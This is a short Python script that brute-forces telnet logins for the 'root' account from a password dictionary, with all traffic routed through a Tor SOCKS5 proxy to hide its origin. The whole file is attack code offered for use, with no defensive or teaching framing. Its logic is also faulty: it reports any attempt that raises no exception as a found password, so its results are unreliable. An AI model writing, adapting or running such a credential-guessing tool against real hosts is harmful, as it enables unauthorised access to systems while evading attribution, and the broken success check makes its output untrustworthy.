import socket
import socks
import telnetlib

socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050) # Tor proxy address and port number
socket.socket = socks.socksocket # Set default socket to use Tor proxy

def telnet_brute_force(ip, user, passwd_file):
    tn = telnetlib.Telnet(ip)
    with open(passwd_file) as f:
        for line in f:
            password = line.strip()
            try:
                tn.read_until(b"login: ")
                tn.write(user.encode('ascii') + b"\n")
                tn.read_until(b"Password: ")
                tn.write(password.encode('ascii') + b"\n")
                tn.read_all()
                print("[+] Password found: " + password)
                return password
            except Exception as e:
                print("[-] Login failed: " + password)
                continue
    print("[-] Password not found.")

ip = "127.0.0.1"
user = "root"
passwd_file = "dictionary.txt"

telnet_brute_force(ip, user, passwd_file)
